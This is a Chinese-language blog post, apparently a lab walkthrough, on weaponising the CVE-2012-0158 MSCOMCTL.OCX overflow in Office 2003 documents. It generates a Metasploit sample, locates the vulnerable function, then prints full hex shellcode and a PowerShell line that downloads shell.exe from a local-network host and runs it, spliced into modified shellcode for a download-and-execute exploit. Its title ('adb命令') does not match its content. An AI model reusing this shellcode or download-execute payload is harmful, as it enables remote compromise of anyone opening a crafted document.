---
layout: post
title: "adb命令"
date: 2020-05-25 
description: "CVE-2012-0158"
tag: Win
---




**环境**

win7

kail 2019

office 2003

**工具:**

010editor

OD/x32dbg/windbg

IDA

这里只谈利用不谈原理

## 用metasploit生成样本

首先在Kali Linux下用metaasploit生成一个CVE-2012-0158弹计算器的样本，步骤如下：

```shell
root@kali:~# msfconsole   //启动msf
msf6 > use exploit/windows/fileformat/ms12_027_mscomctl_bof
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/fileformat/ms12_027_mscomctl_bof) > set CMD calc
CMD => calc
msf6 exploit(windows/fileformat/ms12_027_mscomctl_bof) > set target 0
target => 0
msf6 exploit(windows/fileformat/ms12_027_mscomctl_bof) > exploit

[*] Creating 'msf.doc' file ...
[+] msf.doc stored at /root/.msf4/local/msf.doc  
msf6 exploit(windows/fileformat/ms12_027_mscomctl_bof) > 

```

测试机打开poc
![](/images/CVE-2012-015/1.png)

**分析漏洞模块**

使用IDA定位到漏洞函数MSCOMCTL.OCX模块中的

275C876D函数

![](/images/CVE-2012-0158/2.png)           

![](/images/CVE-2012-0158/3.png)

漏洞原因: 因为他的读取长度和传入长度都是写在文件中的,所以可以达到修改文件内容去控制它传入实际的参数,那就可以造成溢出,

调试poc

![](/images/CVE-2012-0158/4.png)

到达漏洞函数 275C876D 堆栈 看到8282  8282
![](/images/CVE-2012-0158/5.png)

执行后 堆栈已经被覆盖

![](/images/CVE-2012-0158/6.png)
**查看poc文件**

红色为控制的堆栈覆盖大小,蓝色为shellcode 没有找到具有calc计算机的字符串,应该是加密了

![](/images/CVE-2012-0158/7.png)

循环解密shellcode 代码

![](/images/CVE-2012-0158/8.png)

解密后内存中的shellcode

**解密前后对比**

![](/images/CVE-2012-0158/10.png)
![](/images/CVE-2012-0158/9.png)

poc算是分析完了

接下来 exp在msf上生成的poc进行改造

1.破解加密方式,添加自身shellcode

2.删除原shellcode,添加新的shellcode

3.当shellcode加密完成后,讲内存中已解密的shellcode 拷贝至新的文件并加以利用

以3为例:

当解密后找到内存地址,并以C样式的shellcode 复制 保存到txt文件中

![](/images/CVE-2012-0158/11.png)

```
3F9B3F92429B4097F599934B41F93F4EFD974A499BFD3F92974247D6909297409627FD474FF8F54127274E994397434F419827274F4A964890FC98974A92992F40484A929841939791F9F9D646FC9927434A4692F92F91F94B4BF848F848FD2799FC97424343FD4A42429F4FFDFDFCF549F8F59690F541374A4648FC47472F97F840464B9FFD4EF84A973F2F9891F5469F939827FD49374F494098FC91989792929FF54196D6484E404A404199464340904FF54F48964E903FD647F591FC4341989049FD984E9B494299272F99F5FC41FD909B9746FC403F419141FD9390424AD692F8494A374FFC2F4A40F8464641D6FD96904E4A984E9F3F972F4E9748464841F847274E92F8F946D69F9890EB04994FFD9F81C454F2FFFFBAEF4061CEDACDD97424F45E2BC9B13083C60431560F03560FE2F5FCE8820000006089E531C0648B50308B520C8B52148B72280FB74A2631FFAC3C617C022C20C1CF0D01C7E2F252578B52108B4A3C8B4C1178E34801D1518B592001D38B4918E33A498B348B01D631FFACC1CF0D01C738E075F6037DF83B7D2475E4588B582401D3668B0C4B8B581C01D38B048B01D0894424245B5B61595A51FFE05F5F5A8B12EB8D5D6A018D85B20000005068318B6F87FFD5BBF0B5A25668A695BD9DFFD53C067C0A80FBE07505BB4713726F6A0053FFD563616C63
```

添加利用代码   将63616c63 覆盖为利用代码

```
powershell (new-object Net.WebClient).DownloadFile('http://192.168.43.135:8000/shell.exe','c:\test\a.exe');start-process 'c:\test\a.exe';
转换shellcode:
706f7765727368656c6C20286E65772D6F626A656374204E65742E576562436C69656E74292E446F776E6C6F616446696C652827687474703A2F2F3139322E3136382E34332E3133353A383030302F7368656C6C2E657865272C27633A5C746573745C612E65786527293B73746172742D70726F636573732027633A5C746573745C612E657865273B
```

shellcode组合后

```
3F9B3F92429B4097F599934B41F93F4EFD974A499BFD3F92974247D6909297409627FD474FF8F54127274E994397434F419827274F4A964890FC98974A92992F40484A929841939791F9F9D646FC9927434A4692F92F91F94B4BF848F848FD2799FC97424343FD4A42429F4FFDFDFCF549F8F59690F541374A4648FC47472F97F840464B9FFD4EF84A973F2F9891F5469F939827FD49374F494098FC91989792929FF54196D6484E404A404199464340904FF54F48964E903FD647F591FC4341989049FD984E9B494299272F99F5FC41FD909B9746FC403F419141FD9390424AD692F8494A374FFC2F4A40F8464641D6FD96904E4A984E9F3F972F4E9748464841F847274E92F8F946D69F9890EB04994FFD9F81C454F2FFFFBAEF4061CEDACDD97424F45E2BC9B13083C60431560F03560FE2F5FCE8820000006089E531C0648B50308B520C8B52148B72280FB74A2631FFAC3C617C022C20C1CF0D01C7E2F252578B52108B4A3C8B4C1178E34801D1518B592001D38B4918E33A498B348B01D631FFACC1CF0D01C738E075F6037DF83B7D2475E4588B582401D3668B0C4B8B581C01D38B048B01D0894424245B5B61595A51FFE05F5F5A8B12EB8D5D6A018D85B20000005068318B6F87FFD5BBF0B5A25668A695BD9DFFD53C067C0A80FBE07505BB4713726F6A0053FFD5706f7765727368656c6C20286E65772D6F626A656374204E65742E576562436C69656E74292E446F776E6C6F616446696C652827687474703A2F2F3139322E3136382E34332E3133353A383030302F7368656C6C2E657865272C27633A5C746573745C612E65786527293B73746172742D70726F636573732027633A5C746573745C612E657865273B
```

使用010editor 覆盖原shellcode后执行 查看结果

存在一个缺陷那就是 不需要循环解密的那段代码 ,所以要在shellcode中找到并且删除

![](/images/CVE-2012-0158/13.png)

![](/images/CVE-2012-0158/14.png)

new shellcode 

```shell
3F9B3F92429B4097F599934B41F93F4EFD974A499BFD3F92974247D6909297409627FD474FF8F54127274E994397434F419827274F4A964890FC98974A92992F40484A929841939791F9F9D646FC9927434A4692F92F91F94B4BF848F848FD2799FC97424343FD4A42429F4FFDFDFCF549F8F59690F541374A4648FC47472F97F840464B9FFD4EF84A973F2F9891F5469F939827FD49374F494098FC91989792929FF54196D6484E404A404199464340904FF54F48964E903FD647F591FC4341989049FD984E9B494299272F99F5FC41FD909B9746FC403F419141FD9390424AD692F8494A374FFC2F4A40F8464641D6FD96904E4A984E9F3F972F4E9748464841F847274E92F8F946D69F9890EB04994FFD9F81C454F2FFFFBAEF4061CEDACDD97424F45E2BC9FCE8820000006089E531C0648B50308B520C8B52148B72280FB74A2631FFAC3C617C022C20C1CF0D01C7E2F252578B52108B4A3C8B4C1178E34801D1518B592001D38B4918E33A498B348B01D631FFACC1CF0D01C738E075F6037DF83B7D2475E4588B582401D3668B0C4B8B581C01D38B048B01D0894424245B5B61595A51FFE05F5F5A8B12EB8D5D6A018D85B20000005068318B6F87FFD5BBF0B5A25668A695BD9DFFD53C067C0A80FBE07505BB4713726F6A0053FFD5706f7765727368656c6C20286E65772D6F626A656374204E65742E576562436C69656E74292E446F776E6C6F616446696C652827687474703A2F2F3139322E3136382E34332E3133353A383030302F7368656C6C2E657865272C27633A5C746573745C612E65786527293B73746172742D70726F636573732027633A5C746573745C612E657865273B
```

执行后

![](/images/CVE-2012-0158/15.png)

 下载-执行

到此结束



推荐文章 https://www.anquanke.com/post/id/91643
